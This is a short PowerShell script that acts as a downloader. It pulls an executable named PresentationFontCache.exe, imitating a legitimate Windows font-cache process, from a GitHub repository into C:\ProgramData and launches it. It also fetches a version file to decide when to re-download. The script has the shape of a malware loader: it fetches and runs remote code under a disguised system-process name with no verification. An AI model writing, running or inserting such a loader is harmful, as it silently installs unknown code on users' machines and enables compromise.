Start-Sleep -s 10
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
$file_text = "C:\ProgramData\version.txt"

# Download version.txt
$down = New-Object System.Net.WebClient
$down.DownloadFile($url_text,$file_text)

# Read the downloaded version.txt
$version = Get-Content $file_text

# Compare downloaded version.txt with $url_text
if ($version -eq (Invoke-WebRequest -Uri $url_text -UseBasicParsing).Content) {

    $file = "C:\ProgramData\PresentationFontCache.exe"

    # Check if PresentationFontCache.exe exists
    if (Test-Path $file) {
        # Run the exe file
        $exec = New-Object -com shell.application
        $exec.shellexecute($file)
    } else {
        # Download exe file
        $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
        $file = "C:\ProgramData\PresentationFontCache.exe"
        $down = New-Object System.Net.WebClient
        $down.DownloadFile($url,$file)
        # Run the exe file
        $exec = New-Object -com shell.application
        $exec.shellexecute($file)
        }
} else {
    # Version change, download the new exe file
    $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
    $file = "C:\ProgramData\PresentationFontCache.exe"
    $down = New-Object System.Net.WebClient
    $down.DownloadFile($url,$file)
    # Run the exe file
    $exec = New-Object -com shell.application
    $exec.shellexecute($file)
    $url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
    $file_text = "C:\ProgramData\version.txt"
    # Download version.txt
    $down = New-Object System.Net.WebClient
    $down.DownloadFile($url_text,$file_text)
}
# Exit the script
exit
